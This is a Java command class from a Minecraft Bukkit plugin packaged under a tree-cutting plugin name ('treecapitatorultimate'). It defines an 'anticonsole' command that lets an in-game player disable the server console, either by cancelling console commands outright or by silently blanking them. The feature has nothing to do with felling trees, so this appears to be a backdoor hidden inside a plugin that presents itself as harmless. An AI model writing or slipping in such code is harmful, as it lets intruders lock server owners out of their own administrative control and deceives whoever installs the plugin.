package me.bow.treecapitatorultimate.commands.Server;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.server.ServerCommandEvent;

import java.util.ArrayList;

@Command.Info(command = "anticonsole", description = "Disables console", category = CommandCategory.Server)
public class AntiConsole extends Command {
    private boolean isActive = false;
    private cancelMethod method;

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (isActive) {
            isActive = false;
            p.sendMessage(Start.COMMAND_PREFIX + "§cConsole is now enabled!");
            this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " disabled AntiConsole!");
            return;
        }
        if (args.size() == 0 || (!args.get(0).equalsIgnoreCase("mistype") && !args.get(0).equalsIgnoreCase("cancel"))) {
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "You must select mode! Either mistype or cancel");
            return;
        }
        if (args.get(0).equalsIgnoreCase("mistype")) {
            method = cancelMethod.Mistype;
        }
        if (args.get(0).equalsIgnoreCase("cancel")) {
            method = cancelMethod.Cancel;
        }
        isActive = true;
        this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " enabled AntiConsole with mode : " + method.toString() + " !");
        p.sendMessage(Start.COMMAND_PREFIX + "§aConsole is now disabled!");
    }

    @Override
    public void onServerCommand(ServerCommandEvent e) {
        try {
            if (!isActive) return;
            if (method == cancelMethod.Cancel)
                e.setCancelled(true);
            if (method == cancelMethod.Mistype)
                e.setCommand("");
        } catch (Exception ignored) {
        }
    }

    enum cancelMethod {
        Mistype,
        Cancel
    }
}
